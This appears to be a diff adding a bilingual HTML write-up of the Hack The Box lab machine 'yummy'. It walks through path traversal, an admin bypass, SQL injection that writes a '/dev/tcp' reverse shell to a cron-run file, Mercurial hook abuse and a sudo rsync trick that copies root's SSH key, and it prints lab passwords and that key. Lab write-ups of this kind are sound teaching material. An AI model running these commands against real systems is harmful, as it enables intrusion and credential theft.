@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>yummy | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">yummy</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-hard">hard</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target was a restaurant booking web application vulnerable to directory traversal through the iCalendar export functionality. By exploiting this vulnerability, I was able to read sensitive system files including cron scripts that revealed MySQL credentials and an interesting backup script that executed files matching a specific pattern.</p>
+
+                    <p>After gaining access to the application's source code through path traversal, I discovered an authentication bypass vulnerability that allowed me to register as an administrator by setting my email to "administrator". This granted access to an admin dashboard vulnerable to SQL injection in the order sorting parameter. I exploited this SQL injection to write malicious files to the filesystem, specifically creating a fake database status file and a reverse shell script that matched the pattern expected by the cron job monitoring script.</p>
+
+                    <p>Once I obtained initial access as the <code>mysql</code> user, I leveraged writable cron scripts to pivot to the <code>www-data</code> user. From there, I discovered a Mercurial repository in the QA testing application directory that contained historical credentials for the <code>qa</code> user in previous commits. After escalating to <code>qa</code>, I exploited sudo permissions on Mercurial's <code>hg pull</code> command using pre-pull hooks to execute commands as the <code>dev</code> user. Finally, I abused sudo permissions on <code>rsync</code> with wildcard expansion to read root's SSH private key by manipulating command-line arguments, ultimately gaining root access.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> Directory traversal via iCalendar export, authentication bypass, SQL injection for file write operations, Mercurial repository history disclosure, Mercurial pre-pull hook abuse, rsync privilege escalation via wildcard injection and argument manipulation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image6.png" alt="Nmap scan results showing SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals two open ports: SSH on port 22 and HTTP on port 80. I add <code>yummy.htb</code> to my <code>/etc/hosts</code> file to ensure proper domain resolution.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>Navigating to the web application, I find a restaurant booking website with several interesting features:</p>
+                <p><img src="./media/image11.png" alt="Restaurant booking website homepage showing the table reservation interface" /></p>
+
+                <p>The application offers functionality to book tables, register accounts, and log in. After registering and logging in, I can access a <code>/dashboard</code> page that displays my reservations.</p>
+
+                <h3>Exploring the Booking System</h3>
+                <p>Once I create a booking, the dashboard presents several options for managing the reservation:</p>
+                <p><img src="./media/image4.png" alt="Dashboard showing booking management options including iCalendar export" /></p>
+
+                <p>One particularly interesting option is the iCalendar export feature, which downloads a <code>.ics</code> file. Examining this file reveals important information about the backend technology stack:</p>
+                <p><img src="./media/image5.png" alt="Contents of the .ics file showing metadata and a GitHub reference" /></p>
+
+                <p>The file contains a reference to <code>git.io/lLljaA</code>, which redirects to the GitHub repository: <a href="https://github.com/ics-py/ics-py">https://github.com/ics-py/ics-py</a>. This confirms that the backend is using Python with the <code>ics-py</code> library to generate iCalendar files.</p>
+
+                <h2>Directory Traversal Discovery</h2>
+                <p>I notice that the iCalendar file is downloaded from the <code>/export</code> endpoint. Testing for directory traversal vulnerabilities, I initially receive HTTP 500 errors when attempting to access other files:</p>
+                <p><img src="./media/image8.png" alt="HTTP 500 error when attempting initial directory traversal" /></p>
+
+                <p>After further investigation, I discover that the directory traversal requires a two-step process. First, I must call <code>/reminder/{id}</code> to prepare the file, and then I can access it via <code>/export/{path}</code> with the traversal payload.</p>
+
+                <h3>Reading Sensitive System Files</h3>
+                <p>Using this technique, I successfully read <code>/etc/passwd</code> and identify two users with login shells: <code>dev</code> and <code>qa</code>. I attempt to read SSH private keys from <code>/home/{user}/.ssh/id_rsa</code> but find nothing.</p>
+
+                <p>Next, I examine <code>/etc/crontab</code> and discover several scheduled scripts running periodically:</p>
+                <p><img src="./media/image9.png" alt="Crontab file showing scheduled scripts including app_backup.sh, table_cleanup.sh, and dbmonitor.sh" /></p>
+
+                <h3>Analyzing Cron Scripts</h3>
+                <p>The <code>app_backup.sh</code> script performs backup operations:</p>
+                <p><img src="./media/image7.png" alt="Contents of app_backup.sh showing backup operations" /></p>
+
+                <p>The <code>table_cleanup.sh</code> script reveals MySQL credentials:</p>
+                <pre><code class="language-bash">/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql</code></pre>
+
+                <p>I attempt to use these credentials to access the <code>dev</code> and <code>qa</code> user accounts via SSH, but without success.</p>
+
+                <p>The most interesting discovery is in <code>dbmonitor.sh</code>:</p>
+                <p><img src="./media/image2.png" alt="Contents of dbmonitor.sh showing execution of files matching the fixer-v pattern" /></p>
+
+                <p>This script executes <code>/bin/bash</code> on files matching the pattern <code>fixer-v*</code> in <code>/data/scripts/</code>. This presents a clear path to remote code execution if I can write a file with this naming pattern to that directory.</p>
+
+                <h2>Application Source Code Analysis</h2>
+                <p>To gain deeper access to the application logic, I use the path traversal to read the application source code. Using the special path <code>/proc/self/cwd/app.py</code>, which points to the current working directory of the running process, I successfully retrieve the application source:</p>
+                <p><img src="./media/image10.png" alt="Source code snippet from app.py showing SQL injection vulnerability in the order_query parameter" /></p>
+
+                <p>The source code reveals a critical SQL injection vulnerability in the <code>order_query</code> parameter of the admin dashboard. The <code>o</code> parameter is directly concatenated into the SQL query without sanitization. However, this functionality is only accessible to users with administrator privileges.</p>
+
+                <h2>Authentication Bypass</h2>
+                <p>Examining the authentication logic, I discover a weak authorization check:</p>
+                <p><img src="./media/image3.png" alt="Authentication check showing the vulnerable role validation" /></p>
+
+                <p>The application checks if the user's role or email is "administrator". Since the function returns either <code>current_role</code> or <code>email</code>, and only verifies if the returned value equals "administrator", I can bypass this by registering with "administrator" as my email address.</p>
+
+                <p>The registration form has email validation only on the frontend, so I intercept the registration request with Burp Suite and set my email to "administrator", successfully granting myself administrative privileges on the application.</p>
+
+                <h2>SQL Injection for File Write</h2>
+                <p>With administrator access, I can now exploit the SQL injection vulnerability. I first validate the injection using sqlmap, which confirms the vulnerability and reveals that the <code>yummy_db</code> database contains a <code>users</code> table (though it's empty) and other tables with no immediately useful data.</p>
+
+                <p>The key exploitation strategy is to abuse MySQL's file write capabilities through the SQL injection to create two files in <code>/data/scripts/</code>:</p>
+                <ul>
+                    <li><code>dbstatus.json</code> - Required to satisfy a conditional check in the monitoring script</li>
+                    <li><code>fixer-v*.sh</code> - A reverse shell script matching the pattern executed by the cron job</li>
+                </ul>
+
+                <p>I attempt to use sqlmap's file write feature:</p>
+                <pre><code class="language-bash">sqlmap "http://yummy.htb/admindashboard?o=*" --batch --file-write="./fixer-va" --file-dest="/data/scripts/dbstatus.json" --cookie="X-AUTH-Token={cookie}"</code></pre>
+
+                <p>However, sqlmap fails to successfully write the files with the reverse shell payload, likely due to encoding issues with special characters.</p>
+
+                <h3>Manual SQL Injection Exploitation</h3>
+                <p>I manually craft the SQL injection payloads directly in the URL. First, I create the status file:</p>
+                <pre><code class="language-plaintext">http://yummy.htb/admindashboard?s=&o=ASC; select "test" INTO OUTFILE '/data/scripts/dbstatus.json';</code></pre>
+
+                <p>Then, I write the reverse shell script:</p>
+                <pre><code class="language-plaintext">http://yummy.htb/admindashboard?s=&o=ASC; select "bash -i >& /dev/tcp/10.10.16.6/443 0>&1" INTO OUTFILE '/data/scripts/fixer-va.sh';</code></pre>
+
+                <p>After setting up a netcat listener on port 443 and waiting for the cron job to execute, I successfully receive a reverse shell as the <code>mysql</code> user.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After obtaining the shell, I upgrade it to a fully interactive TTY and begin exploring the system. Running <code>ss -tuln</code> to check for locally bound services, I discover several interesting ports:</p>
+                <p><img src="./media/image1.png" alt="Output of ss -tuln showing locally bound ports including MySQL on 3306 and port 2019" /></p>
+
+                <p>Port 2019 is particularly interesting, but sending HTTP requests to it only returns "404 page not found".</p>
+
+                <p>I attempt to use the MySQL credentials found earlier (<code>3wDo7gSRZIwIHRxZ!</code>) to switch to the <code>dev</code> and <code>qa</code> users using <code>su</code>, but without success.</p>
+
+                <h3>Exploiting Writable Cron Scripts</h3>
+                <p>Reviewing the directories I discovered earlier, I notice that <code>/data/scripts</code> has overly permissive permissions:</p>
+                <pre><code class="language-bash">mysql@yummy:/data$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Sep 30  2024 .
+drwxr-xr-x 24 root root 4096 Sep 30  2024 ..
+drwxrwxrwx  2 root root 4096 Oct 20 17:35 scripts</code></pre>
+
+                <p>The <code>scripts</code> directory is world-writable (777 permissions), which means I can modify any of the cron scripts. I identify that <code>app_backup.sh</code> runs as the <code>www-data</code> user, which has access to <code>/var/www/app-qatesting</code>.</p>
+
+                <p>I modify <code>app_backup.sh</code> to execute a reverse shell payload back to my machine, and after the cron job runs, I successfully obtain a shell as <code>www-data</code>.</p>
+
+                <h2>Mercurial Repository Discovery</h2>
+                <p>As the <code>www-data</code> user, I explore the <code>/var/www/app-qatesting</code> directory, which contains a QA testing version of the application. Examining the updated <code>app.py</code>, I notice that the path traversal and SQL injection vulnerabilities have been patched.</p>
+
+                <p>However, I discover a <code>.hg</code> directory in the application root. This indicates the project is using Mercurial, a distributed version control system similar to Git. Mercurial repositories can contain historical commits that may reveal sensitive information.</p>
+
+                <h3>Extracting Credentials from Version History</h3>
+                <p>I use the <code>hg log -p</code> command to view the commit history with full diffs:</p>
+                <pre><code class="language-bash">www-data@yummy:~/app-qatesting/.hg$ hg log -p</code></pre>
+
+                <p>Examining the output, I find a commit that reveals previous database credentials:</p>
+                <pre><code class="language-diff">changeset:   9:f3787cac6111
+tag:         tip
+user:        qa
+date:        Tue May 28 10:37:16 2024 -0400
+summary:     attempt at patching path traversal
+
+diff -r 0bbf8464d2d2 -r f3787cac6111 app.py
+--- a/app.py    Tue May 28 10:34:38 2024 -0400
++++ b/app.py    Tue May 28 10:37:16 2024 -0400
+@@ -19,8 +19,8 @@
+ db_config = {
+     'host': '127.0.0.1',
+-    'user': 'qa',
+-    'password': 'jPAd!XQCtn8Oc@2B',
++    'user': 'chef',
++    'password': '3wDo7gSRZIwIHRxZ!',</code></pre>
+
+                <p>The commit history shows that the <code>qa</code> user previously used the credentials <code>qa:jPAd!XQCtn8Oc@2B</code> to connect to MySQL. I attempt to switch to the <code>qa</code> user with this password:</p>
+                <pre><code class="language-bash">su qa</code></pre>
+
+                <p>Success! I'm now logged in as the <code>qa</code> user and can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Mercurial Hook Abuse</h2>
+                <p>Running <code>sudo -l</code> as the <code>qa</code> user reveals an interesting sudo permission:</p>
+                <pre><code class="language-plaintext">User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/</code></pre>
+
+                <p>I can run Mercurial's <code>hg pull</code> command as the <code>dev</code> user. Similar to Git, Mercurial supports hooks - scripts that execute automatically at certain points during version control operations.</p>
+
+                <h3>Exploiting Pre-Pull Hooks</h3>
+                <p>I decide to abuse a pre-pull hook, which executes before the pull operation. To set this up, I need to create a Mercurial configuration in the <code>qa</code> user's home directory.</p>
+
+                <p>The <code>qa</code> home directory already contains a <code>.hg</code> directory. Inside it, I create an <code>hgrc</code> configuration file with the following content:</p>
+                <pre><code class="language-ini">[hooks]
+pre-pull = /bin/bash</code></pre>
+
+                <p>This configuration tells Mercurial to execute <code>/bin/bash</code> as a shell before performing the pull operation. To avoid permission issues, I set generous permissions on the relevant directories:</p>
+                <pre><code class="language-bash">chmod 777 /home/qa
+chmod 777 /home/qa/.hg</code></pre>
+
+                <p>Now I execute the sudo command:</p>
+                <pre><code class="language-bash">qa@yummy:~$ sudo -u dev hg pull /home/dev/app-production/
+I'm out of office until October 24th, don't call me
+dev@yummy:/home/qa$</code></pre>
+
+                <p>The hook executes successfully, and I receive a shell as the <code>dev</code> user!</p>
+
+                <h2>Privilege Escalation to Root - Rsync Wildcard Injection</h2>
+                <p>As the <code>dev</code> user, I check my sudo permissions:</p>
+                <pre><code class="language-plaintext">User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* /opt/app/</code></pre>
+
+                <p>This sudo rule allows me to run <code>rsync</code> as root with a specific command structure. The critical vulnerability here is the use of the wildcard (<code>*</code>) in the source path.</p>
+
+                <h3>Understanding Rsync Wildcard Exploitation</h3>
+                <p>The wildcard creates two exploitation opportunities:</p>
+                <ol>
+                    <li><strong>Path Traversal:</strong> The wildcard expansion allows me to traverse outside the intended directory using <code>../</code> sequences</li>
+                    <li><strong>Argument Injection:</strong> Additional arguments can be injected between the wildcard expansion and the destination path</li>
+                </ol>
+
+                <p>My exploitation strategy is to use rsync to copy root's SSH private key to a location where I can read it, while changing its ownership to the <code>dev</code> user using the <code>--chown</code> flag.</p>
+
+                <h3>Executing the Final Exploit</h3>
+                <p>I craft and execute the following command:</p>
+                <pre><code class="language-bash">sudo rsync -a --exclude=.hg /home/dev/app-production/../../../root/.ssh/id_rsa --chown dev:dev /opt/app/</code></pre>
+
+                <p>Breaking down this command:</p>
+                <ul>
+                    <li><code>../../../root/.ssh/id_rsa</code> - Traverses from <code>/home/dev/app-production</code> to <code>/root/.ssh/id_rsa</code></li>
+                    <li><code>--chown dev:dev</code> - Changes the ownership of the copied file to <code>dev:dev</code></li>
+                    <li><code>/opt/app/</code> - Destination directory</li>
+                </ul>
+
+                <p>After executing the command, I can now read root's private SSH key:</p>
+                <pre><code class="language-bash">cat /opt/app/id_rsa</code></pre>
+
+                <pre><code class="language-plaintext">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8AAAAJBdGlFYXRpR
+WAAAAAtzc2gtZWQyNTUxOQAAACD8t/wsFHnXuKZw6GVUmPSPPHtqxx1N94baTt1/2esF8A
+AAAEA+trd9XqxX3ZSG9ESLlPSzIadF8ll0l4ll0+DKkhpkhvy3/CwUede4pnDoZVSY9I88
+e2rHHU33htpO3X/Z6wXwAAAACnJvb3RAeXVtbXkBAgM=
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+
+                <p>I save this key to my local machine as <code>id_rsa</code>, set the correct permissions, and authenticate as root:</p>
+                <pre><code class="language-bash">chmod 600 id_rsa
+ssh -i id_rsa root@yummy.htb</code></pre>
+
+                <p>This grants me root access to the system, allowing me to retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> El objetivo era una aplicación web de reservas de restaurante vulnerable a directory traversal a través de la funcionalidad de exportación de iCalendar. Al explotar esta vulnerabilidad, pude leer archivos sensibles del sistema incluyendo scripts cron que revelaron credenciales de MySQL y un interesante script de backup que ejecutaba archivos que coincidían con un patrón específico.</p>
+
+                    <p>Tras obtener acceso al código fuente de la aplicación mediante path traversal, descubrí una vulnerabilidad de bypass de autenticación que me permitió registrarme como administrador estableciendo mi email como "administrator". Esto me otorgó acceso a un panel de administración vulnerable a inyección SQL en el parámetro de ordenación. Exploté esta inyección SQL para escribir archivos maliciosos en el sistema de archivos, específicamente creando un archivo falso de estado de base de datos y un script de reverse shell que coincidía con el patrón esperado por el script cron de monitorización.</p>
+
+                    <p>Una vez obtuve acceso inicial como usuario <code>mysql</code>, aproveché los scripts cron escribibles para pivotar al usuario <code>www-data</code>. Desde ahí, descubrí un repositorio Mercurial en el directorio de la aplicación de testing QA que contenía credenciales históricas del usuario <code>qa</code> en commits anteriores. Tras escalar a <code>qa</code>, exploté permisos sudo en el comando <code>hg pull</code> de Mercurial usando pre-pull hooks para ejecutar comandos como usuario <code>dev</code>. Finalmente, abusé de permisos sudo en <code>rsync</code> con expansión de wildcards para leer la clave SSH privada de root manipulando los argumentos de la línea de comandos, obteniendo finalmente acceso root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Directory traversal mediante exportación de iCalendar, bypass de autenticación, inyección SQL para operaciones de escritura de archivos, divulgación de historial de repositorio Mercurial, abuso de pre-pull hooks de Mercurial, escalada de privilegios en rsync mediante inyección de wildcards y manipulación de argumentos.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image6.png" alt="Resultados del escaneo de nmap mostrando SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+
+                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>yummy.htb</code> a mi archivo <code>/etc/hosts</code> para asegurar la correcta resolución del dominio.</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Navegando a la aplicación web, encuentro un sitio web de reservas de restaurante con varias funcionalidades interesantes:</p>
+                <p><img src="./media/image11.png" alt="Página principal del sitio web de reservas de restaurante mostrando la interfaz de reserva de mesas" /></p>
+
+                <p>La aplicación ofrece funcionalidad para reservar mesas, registrar cuentas e iniciar sesión. Tras registrarme e iniciar sesión, puedo acceder a una página <code>/dashboard</code> que muestra mis reservas.</p>
+
+                <h3>Explorando el Sistema de Reservas</h3>
+                <p>Una vez creo una reserva, el panel de control presenta varias opciones para gestionar la reserva:</p>
+                <p><img src="./media/image4.png" alt="Panel de control mostrando opciones de gestión de reservas incluyendo exportación de iCalendar" /></p>
+
+                <p>Una opción particularmente interesante es la funcionalidad de exportación de iCalendar, que descarga un archivo <code>.ics</code>. Al examinar este archivo, revelo información importante sobre la pila tecnológica del backend:</p>
+                <p><img src="./media/image5.png" alt="Contenido del archivo .ics mostrando metadatos y una referencia a GitHub" /></p>
+
+                <p>El archivo contiene una referencia a <code>git.io/lLljaA</code>, que redirige al repositorio de GitHub: <a href="https://github.com/ics-py/ics-py">https://github.com/ics-py/ics-py</a>. Esto confirma que el backend está utilizando Python con la librería <code>ics-py</code> para generar archivos iCalendar.</p>
+
+                <h2>Descubrimiento de Directory Traversal</h2>
+                <p>Observo que el archivo iCalendar se descarga desde el endpoint <code>/export</code>. Testeando vulnerabilidades de directory traversal, inicialmente recibo errores HTTP 500 cuando intento acceder a otros archivos:</p>
+                <p><img src="./media/image8.png" alt="Error HTTP 500 al intentar directory traversal inicial" /></p>
+
+                <p>Tras mayor investigación, descubro que el directory traversal requiere un proceso de dos pasos. Primero, debo llamar a <code>/reminder/{id}</code> para preparar el archivo, y luego puedo acceder a él mediante <code>/export/{ruta}</code> con el payload de traversal.</p>
+
+                <h3>Leyendo Archivos Sensibles del Sistema</h3>
+                <p>Usando esta técnica, leo exitosamente <code>/etc/passwd</code> e identifico dos usuarios con shells de login: <code>dev</code> y <code>qa</code>. Intento leer claves privadas SSH de <code>/home/{usuario}/.ssh/id_rsa</code> pero no encuentro nada.</p>
+
+                <p>A continuación, examino <code>/etc/crontab</code> y descubro varios scripts programados que se ejecutan periódicamente:</p>
+                <p><img src="./media/image9.png" alt="Archivo crontab mostrando scripts programados incluyendo app_backup.sh, table_cleanup.sh y dbmonitor.sh" /></p>
+
+                <h3>Analizando Scripts Cron</h3>
+                <p>El script <code>app_backup.sh</code> realiza operaciones de backup:</p>
+                <p><img src="./media/image7.png" alt="Contenido de app_backup.sh mostrando operaciones de backup" /></p>
+
+                <p>El script <code>table_cleanup.sh</code> revela credenciales de MySQL:</p>
+                <pre><code class="language-bash">/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql</code></pre>
+
+                <p>Intento usar estas credenciales para acceder a las cuentas de usuario <code>dev</code> y <code>qa</code> mediante SSH, pero sin éxito.</p>
+
+                <p>El descubrimiento más interesante está en <code>dbmonitor.sh</code>:</p>
+                <p><img src="./media/image2.png" alt="Contenido de dbmonitor.sh mostrando ejecución de archivos que coinciden con el patrón fixer-v" /></p>
+
+                <p>Este script ejecuta <code>/bin/bash</code> en archivos que coinciden con el patrón <code>fixer-v*</code> en <code>/data/scripts/</code>. Esto presenta una clara vía hacia la ejecución remota de código si puedo escribir un archivo con este patrón de nomenclatura en ese directorio.</p>
+
+                <h2>Análisis del Código Fuente de la Aplicación</h2>
+                <p>Para obtener acceso más profundo a la lógica de la aplicación, uso el path traversal para leer el código fuente de la aplicación. Utilizando la ruta especial <code>/proc/self/cwd/app.py</code>, que apunta al directorio de trabajo actual del proceso en ejecución, recupero exitosamente el código fuente de la aplicación:</p>
+                <p><img src="./media/image10.png" alt="Fragmento de código fuente de app.py mostrando vulnerabilidad de inyección SQL en el parámetro order_query" /></p>
+
+                <p>El código fuente revela una vulnerabilidad crítica de inyección SQL en el parámetro <code>order_query</code> del panel de administración. El parámetro <code>o</code> se concatena directamente en la consulta SQL sin sanitización. Sin embargo, esta funcionalidad solo es accesible para usuarios con privilegios de administrador.</p>
+
+                <h2>Bypass de Autenticación</h2>
+                <p>Examinando la lógica de autenticación, descubro una comprobación de autorización débil:</p>
+                <p><img src="./media/image3.png" alt="Comprobación de autenticación mostrando la validación de rol vulnerable" /></p>
+
+                <p>La aplicación comprueba si el rol del usuario o el email es "administrator". Como la función devuelve o bien <code>current_role</code> o <code>email</code>, y solo verifica si el valor devuelto es igual a "administrator", puedo hacer bypass de esto registrándome con "administrator" como mi dirección de email.</p>
+
+                <p>El formulario de registro tiene validación de email solo en el frontend, así que intercepto la petición de registro con Burp Suite y establezco mi email como "administrator", otorgándome exitosamente privilegios administrativos en la aplicación.</p>
+
+                <h2>Inyección SQL para Escritura de Archivos</h2>
+                <p>Con acceso de administrador, ahora puedo explotar la vulnerabilidad de inyección SQL. Primero valido la inyección usando sqlmap, que confirma la vulnerabilidad y revela que la base de datos <code>yummy_db</code> contiene una tabla <code>users</code> (aunque está vacía) y otras tablas sin datos inmediatamente útiles.</p>
+
+                <p>La estrategia clave de explotación es abusar de las capacidades de escritura de archivos de MySQL a través de la inyección SQL para crear dos archivos en <code>/data/scripts/</code>:</p>
+                <ul>
+                    <li><code>dbstatus.json</code> - Necesario para satisfacer una comprobación condicional en el script de monitorización</li>
+                    <li><code>fixer-v*.sh</code> - Un script de reverse shell que coincide con el patrón ejecutado por el trabajo cron</li>
+                </ul>
+
+                <p>Intento usar la funcionalidad de escritura de archivos de sqlmap:</p>
+                <pre><code class="language-bash">sqlmap "http://yummy.htb/admindashboard?o=*" --batch --file-write="./fixer-va" --file-dest="/data/scripts/dbstatus.json" --cookie="X-AUTH-Token={cookie}"</code></pre>
+
+                <p>Sin embargo, sqlmap falla al escribir exitosamente los archivos con el payload de reverse shell, probablemente debido a problemas de codificación con caracteres especiales.</p>
+
+                <h3>Explotación Manual de Inyección SQL</h3>
+                <p>Elaboro manualmente los payloads de inyección SQL directamente en la URL. Primero, creo el archivo de estado:</p>
+                <pre><code class="language-plaintext">http://yummy.htb/admindashboard?s=&o=ASC; select "test" INTO OUTFILE '/data/scripts/dbstatus.json';</code></pre>
+
+                <p>Luego, escribo el script de reverse shell:</p>
+                <pre><code class="language-plaintext">http://yummy.htb/admindashboard?s=&o=ASC; select "bash -i >& /dev/tcp/10.10.16.6/443 0>&1" INTO OUTFILE '/data/scripts/fixer-va.sh';</code></pre>
+
+                <p>Tras configurar un listener de netcat en el puerto 443 y esperar a que el trabajo cron se ejecute, recibo exitosamente una reverse shell como usuario <code>mysql</code>.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras obtener la shell, la actualizo a una TTY completamente interactiva y comienzo a explorar el sistema. Ejecutando <code>ss -tuln</code> para comprobar servicios vinculados localmente, descubro varios puertos interesantes:</p>
+                <p><img src="./media/image1.png" alt="Salida de ss -tuln mostrando puertos vinculados localmente incluyendo MySQL en 3306 y puerto 2019" /></p>
+
+                <p>El puerto 2019 es particularmente interesante, pero enviar peticiones HTTP a él solo devuelve "404 page not found".</p>
+
+                <p>Intento usar las credenciales de MySQL encontradas anteriormente (<code>3wDo7gSRZIwIHRxZ!</code>) para cambiar a los usuarios <code>dev</code> y <code>qa</code> usando <code>su</code>, pero sin éxito.</p>
+
+                <h3>Explotando Scripts Cron Escribibles</h3>
+                <p>Revisando los directorios que descubrí anteriormente, observo que <code>/data/scripts</code> tiene permisos excesivamente permisivos:</p>
+                <pre><code class="language-bash">mysql@yummy:/data$ ls -la
+total 12
+drwxr-xr-x  3 root root 4096 Sep 30  2024 .
+drwxr-xr-x 24 root root 4096 Sep 30  2024 ..
+drwxrwxrwx  2 root root 4096 Oct 20 17:35 scripts</code></pre>
+
+                <p>El directorio <code>scripts</code> tiene permisos de escritura para todos (permisos 777), lo que significa que puedo modificar cualquiera de los scripts cron. Identifico que <code>app_backup.sh</code> se ejecuta como usuario <code>www-data</code>, que tiene acceso a <code>/var/www/app-qatesting</code>.</p>
+
+                <p>Modifico <code>app_backup.sh</code> para ejecutar un payload de reverse shell hacia mi máquina, y tras ejecutarse el trabajo cron, obtengo exitosamente una shell como <code>www-data</code>.</p>
+
+                <h2>Descubrimiento del Repositorio Mercurial</h2>
+                <p>Como usuario <code>www-data</code>, exploro el directorio <code>/var/www/app-qatesting</code>, que contiene una versión de testing QA de la aplicación. Examinando el <code>app.py</code> actualizado, noto que las vulnerabilidades de path traversal e inyección SQL han sido parcheadas.</p>
+
+                <p>Sin embargo, descubro un directorio <code>.hg</code> en la raíz de la aplicación. Esto indica que el proyecto está usando Mercurial, un sistema de control de versiones distribuido similar a Git. Los repositorios Mercurial pueden contener commits históricos que pueden revelar información sensible.</p>
+
+                <h3>Extrayendo Credenciales del Historial de Versiones</h3>
+                <p>Uso el comando <code>hg log -p</code> para ver el historial de commits con diffs completos:</p>
+                <pre><code class="language-bash">www-data@yummy:~/app-qatesting/.hg$ hg log -p</code></pre>
+
+                <p>Examinando la salida, encuentro un commit que revela credenciales de base de datos anteriores:</p>
+                <pre><code class="language-diff">changeset:   9:f3787cac6111
+tag:         tip
+user:        qa
+date:        Tue May 28 10:37:16 2024 -0400
+summary:     attempt at patching path traversal
+
+diff -r 0bbf8464d2d2 -r f3787cac6111 app.py
+--- a/app.py    Tue May 28 10:34:38 2024 -0400
++++ b/app.py    Tue May 28 10:37:16 2024 -0400
+@@ -19,8 +19,8 @@
+ db_config = {
+     'host': '127.0.0.1',
+-    'user': 'qa',
+-    'password': 'jPAd!XQCtn8Oc@2B',
++    'user': 'chef',
++    'password': '3wDo7gSRZIwIHRxZ!',</code></pre>
+
+                <p>El historial de commits muestra que el usuario <code>qa</code> anteriormente usaba las credenciales <code>qa:jPAd!XQCtn8Oc@2B</code> para conectar a MySQL. Intento cambiar al usuario <code>qa</code> con esta contraseña:</p>
+                <pre><code class="language-bash">su qa</code></pre>
+
+                <p>¡Éxito! Ahora estoy conectado como usuario <code>qa</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Abuso de Hooks de Mercurial</h2>
+                <p>Ejecutando <code>sudo -l</code> como usuario <code>qa</code> revela un permiso sudo interesante:</p>
+                <pre><code class="language-plaintext">User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/</code></pre>
+
+                <p>Puedo ejecutar el comando <code>hg pull</code> de Mercurial como usuario <code>dev</code>. Similar a Git, Mercurial soporta hooks - scripts que se ejecutan automáticamente en ciertos puntos durante operaciones de control de versiones.</p>
+
+                <h3>Explotando Pre-Pull Hooks</h3>
+                <p>Decido abusar de un pre-pull hook, que se ejecuta antes de la operación de pull. Para configurar esto, necesito crear una configuración de Mercurial en el directorio home del usuario <code>qa</code>.</p>
+
+                <p>El directorio home de <code>qa</code> ya contiene un directorio <code>.hg</code>. Dentro de él, creo un archivo de configuración <code>hgrc</code> con el siguiente contenido:</p>
+                <pre><code class="language-ini">[hooks]
+pre-pull = /bin/bash</code></pre>
+
+                <p>Esta configuración le dice a Mercurial que ejecute <code>/bin/bash</code> como shell antes de realizar la operación de pull. Para evitar problemas de permisos, establezco permisos generosos en los directorios relevantes:</p>
+                <pre><code class="language-bash">chmod 777 /home/qa
+chmod 777 /home/qa/.hg</code></pre>
+
+                <p>Ahora ejecuto el comando sudo:</p>
+                <pre><code class="language-bash">qa@yummy:~$ sudo -u dev hg pull /home/dev/app-production/
+I'm out of office until October 24th, don't call me
+dev@yummy:/home/qa$</code></pre>
+
+                <p>¡El hook se ejecuta exitosamente y recibo una shell como usuario <code>dev</code>!</p>
+
